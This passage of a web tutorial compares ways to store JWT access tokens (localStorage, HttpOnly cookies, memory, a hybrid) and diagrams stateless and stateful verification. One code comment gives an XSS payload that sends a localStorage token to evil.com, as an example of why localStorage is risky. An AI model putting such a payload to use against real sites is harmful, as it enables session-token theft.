<a id="__codelineno-32-16" name="__codelineno-32-16" href="#__codelineno-32-16"></a><span class="w">    </span><span class="k">async</span><span class="w"> </span><span class="nx">makeAuthRequest</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-32-17" name="__codelineno-32-17" href="#__codelineno-32-17"></a><span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">getToken</span><span class="p">();</span>
<a id="__codelineno-32-18" name="__codelineno-32-18" href="#__codelineno-32-18"></a><span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-32-19" name="__codelineno-32-19" href="#__codelineno-32-19"></a><span class="w">            </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-32-20" name="__codelineno-32-20" href="#__codelineno-32-20"></a><span class="w">                </span><span class="s1">&#39;Authorization&#39;</span><span class="o">:</span><span class="w"> </span><span class="sb">`Bearer </span><span class="si">${</span><span class="nx">token</span><span class="si">}</span><span class="sb">`</span>
<a id="__codelineno-32-21" name="__codelineno-32-21" href="#__codelineno-32-21"></a><span class="w">            </span><span class="p">}</span>
<a id="__codelineno-32-22" name="__codelineno-32-22" href="#__codelineno-32-22"></a><span class="w">        </span><span class="p">});</span>
<a id="__codelineno-32-23" name="__codelineno-32-23" href="#__codelineno-32-23"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
<a id="__codelineno-32-24" name="__codelineno-32-24" href="#__codelineno-32-24"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-32-25" name="__codelineno-32-25" href="#__codelineno-32-25"></a><span class="p">}</span>
<a id="__codelineno-32-26" name="__codelineno-32-26" href="#__codelineno-32-26"></a>
<a id="__codelineno-32-27" name="__codelineno-32-27" href="#__codelineno-32-27"></a><span class="c1">// XSS Attack Example:</span>
<a id="__codelineno-32-28" name="__codelineno-32-28" href="#__codelineno-32-28"></a><span class="c1">// If attacker injects: &lt;script&gt;</span>
<a id="__codelineno-32-29" name="__codelineno-32-29" href="#__codelineno-32-29"></a><span class="c1">//   fetch(&#39;https://evil.com?token=&#39; + localStorage.getItem(&#39;access_token&#39;))</span>
<a id="__codelineno-32-30" name="__codelineno-32-30" href="#__codelineno-32-30"></a><span class="c1">// &lt;/script&gt;</span>
<a id="__codelineno-32-31" name="__codelineno-32-31" href="#__codelineno-32-31"></a><span class="c1">// Your token is stolen! </span>
</code></pre></div>
<h4 id="2-httponly-cookie-recommended">2. HttpOnly Cookie ( RECOMMENDED)</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c1">//  SECURE: Protected from XSS</span>
<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="c1">// Server-side (Node.js/Express)</span>
<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
<a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>
<a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="w">    </span><span class="c1">// Authenticate user...</span>
<a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">generateJWT</span><span class="p">(</span><span class="nx">userId</span><span class="p">);</span>
<a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>
<a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a><span class="w">    </span><span class="c1">// Set HttpOnly cookie</span>
<a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a><span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s1">&#39;access_token&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a><span class="w">        </span><span class="nx">httpOnly</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">      </span><span class="c1">//  Not accessible via JavaScript</span>
<a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a><span class="w">        </span><span class="nx">secure</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">        </span><span class="c1">//  Only sent over HTTPS</span>
<a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a><span class="w">        </span><span class="nx">sameSite</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;strict&#39;</span><span class="p">,</span><span class="w">  </span><span class="c1">//  CSRF protection</span>
<a id="__codelineno-33-14" name="__codelineno-33-14" href="#__codelineno-33-14"></a><span class="w">        </span><span class="nx">maxAge</span><span class="o">:</span><span class="w"> </span><span class="mf">900000</span><span class="p">,</span><span class="w">      </span><span class="c1">// 15 minutes</span>
<a id="__codelineno-33-15" name="__codelineno-33-15" href="#__codelineno-33-15"></a><span class="w">        </span><span class="nx">path</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="p">,</span>
<a id="__codelineno-33-16" name="__codelineno-33-16" href="#__codelineno-33-16"></a><span class="w">        </span><span class="nx">domain</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;.example.com&#39;</span><span class="w">  </span><span class="c1">// Share across subdomains</span>
<a id="__codelineno-33-17" name="__codelineno-33-17" href="#__codelineno-33-17"></a><span class="w">    </span><span class="p">});</span>
<a id="__codelineno-33-18" name="__codelineno-33-18" href="#__codelineno-33-18"></a>
<a id="__codelineno-33-19" name="__codelineno-33-19" href="#__codelineno-33-19"></a><span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">success</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">});</span>
<a id="__codelineno-33-20" name="__codelineno-33-20" href="#__codelineno-33-20"></a><span class="p">});</span>
<a id="__codelineno-33-21" name="__codelineno-33-21" href="#__codelineno-33-21"></a>
<a id="__codelineno-33-22" name="__codelineno-33-22" href="#__codelineno-33-22"></a><span class="c1">// Client-side (Browser)</span>
<a id="__codelineno-33-23" name="__codelineno-33-23" href="#__codelineno-33-23"></a><span class="c1">// No need to manually handle token!</span>
<a id="__codelineno-33-24" name="__codelineno-33-24" href="#__codelineno-33-24"></a><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">makeAuthRequest</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-33-25" name="__codelineno-33-25" href="#__codelineno-33-25"></a><span class="w">    </span><span class="c1">// Cookie automatically included by browser</span>
<a id="__codelineno-33-26" name="__codelineno-33-26" href="#__codelineno-33-26"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-33-27" name="__codelineno-33-27" href="#__codelineno-33-27"></a><span class="w">        </span><span class="nx">credentials</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;include&#39;</span><span class="w">  </span><span class="c1">// Include cookies in request</span>
<a id="__codelineno-33-28" name="__codelineno-33-28" href="#__codelineno-33-28"></a><span class="w">    </span><span class="p">});</span>
<a id="__codelineno-33-29" name="__codelineno-33-29" href="#__codelineno-33-29"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
<a id="__codelineno-33-30" name="__codelineno-33-30" href="#__codelineno-33-30"></a><span class="p">}</span>
<a id="__codelineno-33-31" name="__codelineno-33-31" href="#__codelineno-33-31"></a>
<a id="__codelineno-33-32" name="__codelineno-33-32" href="#__codelineno-33-32"></a><span class="c1">// Logout endpoint</span>
<a id="__codelineno-33-33" name="__codelineno-33-33" href="#__codelineno-33-33"></a><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/logout&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-33-34" name="__codelineno-33-34" href="#__codelineno-33-34"></a><span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">clearCookie</span><span class="p">(</span><span class="s1">&#39;access_token&#39;</span><span class="p">);</span>
<a id="__codelineno-33-35" name="__codelineno-33-35" href="#__codelineno-33-35"></a><span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">success</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">});</span>
<a id="__codelineno-33-36" name="__codelineno-33-36" href="#__codelineno-33-36"></a><span class="p">});</span>
</code></pre></div>
<h4 id="3-memory-storage-highest-security">3. Memory Storage (Highest Security)</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="c1">//  MOST SECURE: Lost on refresh</span>
<a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="kd">class</span><span class="w"> </span><span class="nx">TokenStorageMemory</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">  </span><span class="c1">// Only in memory</span>
<a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>
<a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a><span class="w">    </span><span class="nx">saveToken</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">token</span><span class="p">;</span>
<a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a>
<a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a><span class="w">    </span><span class="nx">getToken</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">token</span><span class="p">;</span>
<a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-34-14" name="__codelineno-34-14" href="#__codelineno-34-14"></a>
<a id="__codelineno-34-15" name="__codelineno-34-15" href="#__codelineno-34-15"></a><span class="w">    </span><span class="nx">removeToken</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-34-16" name="__codelineno-34-16" href="#__codelineno-34-16"></a><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
<a id="__codelineno-34-17" name="__codelineno-34-17" href="#__codelineno-34-17"></a><span class="w">    </span><span class="p">}</span>
<a id="__codelineno-34-18" name="__codelineno-34-18" href="#__codelineno-34-18"></a><span class="p">}</span>
<a id="__codelineno-34-19" name="__codelineno-34-19" href="#__codelineno-34-19"></a>
<a id="__codelineno-34-20" name="__codelineno-34-20" href="#__codelineno-34-20"></a><span class="c1">// Token lost on page refresh</span>
<a id="__codelineno-34-21" name="__codelineno-34-21" href="#__codelineno-34-21"></a><span class="c1">// User must login again</span>
<a id="__codelineno-34-22" name="__codelineno-34-22" href="#__codelineno-34-22"></a><span class="c1">// Best for banking/financial apps</span>
</code></pre></div>
<h4 id="4-hybrid-approach-best-practice">4. Hybrid Approach (Best Practice)</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="c1">//  BEST PRACTICE: HttpOnly cookie + localStorage for metadata</span>
<a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="c1">// Server sets HttpOnly cookie with JWT</span>
<a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">generateJWT</span><span class="p">(</span><span class="nx">userId</span><span class="p">);</span>
<a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>
<a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a><span class="w">    </span><span class="c1">// JWT in HttpOnly cookie</span>
<a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s1">&#39;access_token&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a><span class="w">        </span><span class="nx">httpOnly</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a><span class="w">        </span><span class="nx">secure</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a><span class="w">        </span><span class="nx">sameSite</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;strict&#39;</span><span class="p">,</span>
<a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a><span class="w">        </span><span class="nx">maxAge</span><span class="o">:</span><span class="w"> </span><span class="mf">900000</span>
<a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a><span class="w">    </span><span class="p">});</span>
<a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a>
<a id="__codelineno-35-14" name="__codelineno-35-14" href="#__codelineno-35-14"></a><span class="w">    </span><span class="c1">// Non-sensitive metadata in response</span>
<a id="__codelineno-35-15" name="__codelineno-35-15" href="#__codelineno-35-15"></a><span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span>
<a id="__codelineno-35-16" name="__codelineno-35-16" href="#__codelineno-35-16"></a><span class="w">        </span><span class="nx">success</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<a id="__codelineno-35-17" name="__codelineno-35-17" href="#__codelineno-35-17"></a><span class="w">        </span><span class="nx">user</span><span class="o">:</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-35-18" name="__codelineno-35-18" href="#__codelineno-35-18"></a><span class="w">            </span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="nx">userId</span><span class="p">,</span>
<a id="__codelineno-35-19" name="__codelineno-35-19" href="#__codelineno-35-19"></a><span class="w">            </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="nx">userName</span><span class="p">,</span>
<a id="__codelineno-35-20" name="__codelineno-35-20" href="#__codelineno-35-20"></a><span class="w">            </span><span class="nx">role</span><span class="o">:</span><span class="w"> </span><span class="nx">userRole</span>
<a id="__codelineno-35-21" name="__codelineno-35-21" href="#__codelineno-35-21"></a><span class="w">        </span><span class="p">},</span>
<a id="__codelineno-35-22" name="__codelineno-35-22" href="#__codelineno-35-22"></a><span class="w">        </span><span class="nx">expiresAt</span><span class="o">:</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">900000</span>
<a id="__codelineno-35-23" name="__codelineno-35-23" href="#__codelineno-35-23"></a><span class="w">    </span><span class="p">});</span>
<a id="__codelineno-35-24" name="__codelineno-35-24" href="#__codelineno-35-24"></a><span class="p">});</span>
<a id="__codelineno-35-25" name="__codelineno-35-25" href="#__codelineno-35-25"></a>
<a id="__codelineno-35-26" name="__codelineno-35-26" href="#__codelineno-35-26"></a><span class="c1">// Client stores metadata (NOT token) in localStorage</span>
<a id="__codelineno-35-27" name="__codelineno-35-27" href="#__codelineno-35-27"></a><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">,</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
<a id="__codelineno-35-28" name="__codelineno-35-28" href="#__codelineno-35-28"></a><span class="w">    </span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="nx">userId</span><span class="p">,</span>
<a id="__codelineno-35-29" name="__codelineno-35-29" href="#__codelineno-35-29"></a><span class="w">    </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="nx">userName</span><span class="p">,</span>
<a id="__codelineno-35-30" name="__codelineno-35-30" href="#__codelineno-35-30"></a><span class="w">    </span><span class="nx">role</span><span class="o">:</span><span class="w"> </span><span class="nx">userRole</span>
<a id="__codelineno-35-31" name="__codelineno-35-31" href="#__codelineno-35-31"></a><span class="p">}));</span>
<a id="__codelineno-35-32" name="__codelineno-35-32" href="#__codelineno-35-32"></a>
<a id="__codelineno-35-33" name="__codelineno-35-33" href="#__codelineno-35-33"></a><span class="c1">// Client knows when to refresh token</span>
<a id="__codelineno-35-34" name="__codelineno-35-34" href="#__codelineno-35-34"></a><span class="kd">const</span><span class="w"> </span><span class="nx">expiresAt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">900000</span><span class="p">;</span>
<a id="__codelineno-35-35" name="__codelineno-35-35" href="#__codelineno-35-35"></a><span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="s1">&#39;token_expires_at&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">expiresAt</span><span class="p">);</span>
<a id="__codelineno-35-36" name="__codelineno-35-36" href="#__codelineno-35-36"></a>
<a id="__codelineno-35-37" name="__codelineno-35-37" href="#__codelineno-35-37"></a><span class="c1">// Check if token expired (client-side)</span>
<a id="__codelineno-35-38" name="__codelineno-35-38" href="#__codelineno-35-38"></a><span class="kd">function</span><span class="w"> </span><span class="nx">isTokenExpired</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-35-39" name="__codelineno-35-39" href="#__codelineno-35-39"></a><span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">expiresAt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="s1">&#39;token_expires_at&#39;</span><span class="p">);</span>
<a id="__codelineno-35-40" name="__codelineno-35-40" href="#__codelineno-35-40"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">expiresAt</span><span class="p">);</span>
<a id="__codelineno-35-41" name="__codelineno-35-41" href="#__codelineno-35-41"></a><span class="p">}</span>
</code></pre></div>
<hr />
<h2 id="is-jwt-stateless-or-stateful">Is JWT Stateless or Stateful?</h2>
<h3 id="pure-jwt-stateless">Pure JWT: Stateless</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>
<a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>                 Stateless JWT Architecture                 
<a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>
<a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>                                                             
<a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>                                 
<a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>    Client                                 API Server  
<a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>                                 
<a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a>                                                          
<a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a>         1. Request with JWT                             
<a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a>         Authorization: Bearer eyJhbGci...               
<a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a>       &gt;       
<a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a>                                                          
<a id="__codelineno-36-13" name="__codelineno-36-13" href="#__codelineno-36-13"></a>                     2. Verify JWT (NO DB LOOKUP)        
<a id="__codelineno-36-14" name="__codelineno-36-14" href="#__codelineno-36-14"></a>                                         
<a id="__codelineno-36-15" name="__codelineno-36-15" href="#__codelineno-36-15"></a>                         Decode JWT                    
<a id="__codelineno-36-16" name="__codelineno-36-16" href="#__codelineno-36-16"></a>                                         
<a id="__codelineno-36-17" name="__codelineno-36-17" href="#__codelineno-36-17"></a>                                                        
<a id="__codelineno-36-18" name="__codelineno-36-18" href="#__codelineno-36-18"></a>                                         
<a id="__codelineno-36-19" name="__codelineno-36-19" href="#__codelineno-36-19"></a>                         Verify Sig                    
<a id="__codelineno-36-20" name="__codelineno-36-20" href="#__codelineno-36-20"></a>                         with Public                   
<a id="__codelineno-36-21" name="__codelineno-36-21" href="#__codelineno-36-21"></a>                         Key                           
<a id="__codelineno-36-22" name="__codelineno-36-22" href="#__codelineno-36-22"></a>                                         
<a id="__codelineno-36-23" name="__codelineno-36-23" href="#__codelineno-36-23"></a>                                                        
<a id="__codelineno-36-24" name="__codelineno-36-24" href="#__codelineno-36-24"></a>                                         
<a id="__codelineno-36-25" name="__codelineno-36-25" href="#__codelineno-36-25"></a>                         Validate                      
<a id="__codelineno-36-26" name="__codelineno-36-26" href="#__codelineno-36-26"></a>                         Claims                        
<a id="__codelineno-36-27" name="__codelineno-36-27" href="#__codelineno-36-27"></a>                         (exp, aud)                    
<a id="__codelineno-36-28" name="__codelineno-36-28" href="#__codelineno-36-28"></a>                                         
<a id="__codelineno-36-29" name="__codelineno-36-29" href="#__codelineno-36-29"></a>                                                        
<a id="__codelineno-36-30" name="__codelineno-36-30" href="#__codelineno-36-30"></a>                            Valid                     
<a id="__codelineno-36-31" name="__codelineno-36-31" href="#__codelineno-36-31"></a>                                                          
<a id="__codelineno-36-32" name="__codelineno-36-32" href="#__codelineno-36-32"></a>         3. Return Data                                  
<a id="__codelineno-36-33" name="__codelineno-36-33" href="#__codelineno-36-33"></a>       &lt;       
<a id="__codelineno-36-34" name="__codelineno-36-34" href="#__codelineno-36-34"></a>                                                          
<a id="__codelineno-36-35" name="__codelineno-36-35" href="#__codelineno-36-35"></a>                                                             
<a id="__codelineno-36-36" name="__codelineno-36-36" href="#__codelineno-36-36"></a>   Advantages:                                            
<a id="__codelineno-36-37" name="__codelineno-36-37" href="#__codelineno-36-37"></a>   No database lookup                                      
<a id="__codelineno-36-38" name="__codelineno-36-38" href="#__codelineno-36-38"></a>   Fast verification                                       
<a id="__codelineno-36-39" name="__codelineno-36-39" href="#__codelineno-36-39"></a>   Scales horizontally                                     
<a id="__codelineno-36-40" name="__codelineno-36-40" href="#__codelineno-36-40"></a>   No server-side session storage                          
<a id="__codelineno-36-41" name="__codelineno-36-41" href="#__codelineno-36-41"></a>                                                             
<a id="__codelineno-36-42" name="__codelineno-36-42" href="#__codelineno-36-42"></a>   Disadvantages:                                         
<a id="__codelineno-36-43" name="__codelineno-36-43" href="#__codelineno-36-43"></a>   Cannot revoke token before expiry                       
<a id="__codelineno-36-44" name="__codelineno-36-44" href="#__codelineno-36-44"></a>   Must wait for token to expire                           
<a id="__codelineno-36-45" name="__codelineno-36-45" href="#__codelineno-36-45"></a>   If compromised, valid until expiry                      
<a id="__codelineno-36-46" name="__codelineno-36-46" href="#__codelineno-36-46"></a>                                                             
<a id="__codelineno-36-47" name="__codelineno-36-47" href="#__codelineno-36-47"></a>
</code></pre></div>
<h3 id="stateful-jwt-hybrid-approach">Stateful JWT: Hybrid Approach</h3>
<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>
<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>              Stateful JWT Architecture                     
<a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>          (JWT + Server-Side Validation)                    
<a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>
<a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>                                                             
<a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>                                 
<a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>    Client                                 API Server  
<a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a>                                 
<a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a>                                                          
<a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a>         1. Request with JWT                             
<a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a>         Authorization: Bearer eyJhbGci...               
<a id="__codelineno-37-12" name="__codelineno-37-12" href="#__codelineno-37-12"></a>       &gt;       
<a id="__codelineno-37-13" name="__codelineno-37-13" href="#__codelineno-37-13"></a>                                                          
<a id="__codelineno-37-14" name="__codelineno-37-14" href="#__codelineno-37-14"></a>                     2. Verify JWT Signature             
<a id="__codelineno-37-15" name="__codelineno-37-15" href="#__codelineno-37-15"></a>                                         
<a id="__codelineno-37-16" name="__codelineno-37-16" href="#__codelineno-37-16"></a>                         Verify Sig                    
<a id="__codelineno-37-17" name="__codelineno-37-17" href="#__codelineno-37-17"></a>                                         
<a id="__codelineno-37-18" name="__codelineno-37-18" href="#__codelineno-37-18"></a>                                                        
<a id="__codelineno-37-19" name="__codelineno-37-19" href="#__codelineno-37-19"></a>                     3. Check Blacklist/DB               
<a id="__codelineno-37-20" name="__codelineno-37-20" href="#__codelineno-37-20"></a>                                         
<a id="__codelineno-37-21" name="__codelineno-37-21" href="#__codelineno-37-21"></a>                         Redis/DB                      
<a id="__codelineno-37-22" name="__codelineno-37-22" href="#__codelineno-37-22"></a>                         Lookup                        
<a id="__codelineno-37-23" name="__codelineno-37-23" href="#__codelineno-37-23"></a>                                                       
<a id="__codelineno-37-24" name="__codelineno-37-24" href="#__codelineno-37-24"></a>                         SELECT *                      
<a id="__codelineno-37-25" name="__codelineno-37-25" href="#__codelineno-37-25"></a>                         FROM tokens                   
<a id="__codelineno-37-26" name="__codelineno-37-26" href="#__codelineno-37-26"></a>                         WHERE jti=?                   
<a id="__codelineno-37-27" name="__codelineno-37-27" href="#__codelineno-37-27"></a>                                         
